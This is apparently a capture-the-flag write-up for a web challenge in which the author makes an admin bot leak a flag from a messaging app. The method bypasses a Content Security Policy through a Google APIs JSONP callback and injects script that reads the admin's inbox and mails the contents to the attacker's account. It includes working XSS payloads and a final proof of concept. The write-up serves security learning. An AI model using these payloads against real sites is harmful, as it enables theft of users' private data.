---
{"dg-publish":true,"permalink":"/personal-site/completed-writeups/ca26/massagold/","tags":["web","CyberApocalypse-26","XSS","csp-bypass","jsonp"],"dg-note-properties":{"tags":["web","CyberApocalypse-26","XSS","csp-bypass","jsonp"]}}
---

looks like a simple messaging app. you have an inbox, and can send messages to other users.
I immediately thought that I need to get the admin bot to send me back a message with the flag in it. I thought possibly stealing a cookie, but httponly was set to true, so that's a no go.
additionally, the Content security policy  allowed scripts only from itself and `https://www.googleapis.com;`

leveraging an endpoint here to bypass the csp is what we need to do, and luckily I came across `https://www.googleapis.com/customsearch/v1?callback=`

a test payload was successful:
```html
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"></script>
```

![](/img/user/img/Pasted%20Image.png)

working with the post body from sending a message I came up with :
```js
fetch('/messages',{
        method:'POST',
        headers:{
            'Content-Type':'application/x-www-form-urlencoded'
        },
        body:'to_username=turboburbo&content=hello'
```
and I was able to get messages back from the admin bot.
![](/img/user/img/Pasted%20image%2020260909132614.png)

building from that, I started to look for messages I could grab from admin's inbox:
```js
fetch('/messages/1')
.then(r=>r.text())
.then(t=>{
    const c=new DOMParser()
    .parseFromString(t,'text/html')
    .querySelector('.letter-copy')
    .innerText;

    fetch('/messages',{
        method:'POST',
        headers:{
            'Content-Type':'application/x-www-form-urlencoded'
        },
        body:'to_username=turboburbo&content='+encodeURIComponent(c)
    })
})
```
but I was getting invalid jsonp callback errors.
it was doing weird char conversion for the `>` in the arrow notation and for a while I did not even think to rewrite it. Once I realized I was being stupid, I rewrote:
```js
fetch('/messages/1').
then(function(r){
    return r.text()
})
.then(function(t){
    const c=new DOMParser()
    .parseFromString(t,'text/html')
    .querySelector('.letter-copy')
    .innerText;
    
    fetch('/messages',{
        method:'POST',
        headers:{
            'Content-Type':'application/x-www-form-urlencoded'
        },
        body:'to_username=turboburbo%26content='+encodeURIComponent(c)
    })
})
``` 
this time it was failing on the `+` in the post body, so changing that to %2B finally worked, and the first message in the inbox was the correct one.

> [!bug]+ poc
> 
> ```html
> <script src="https://www.googleapis.com/customsearch/v1?callback=fetch('/messages/1').then(function(r){return r.text()}).then(function(t){var c=new DOMParser().parseFromString(t,'text/html').querySelector('.letter-copy').innerText;fetch('/messages',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'to_username=turboburbo%26content='%2BencodeURIComponent(c)})})">
> ```

![](/img/user/img/Pasted%20image%2020260909133208.png)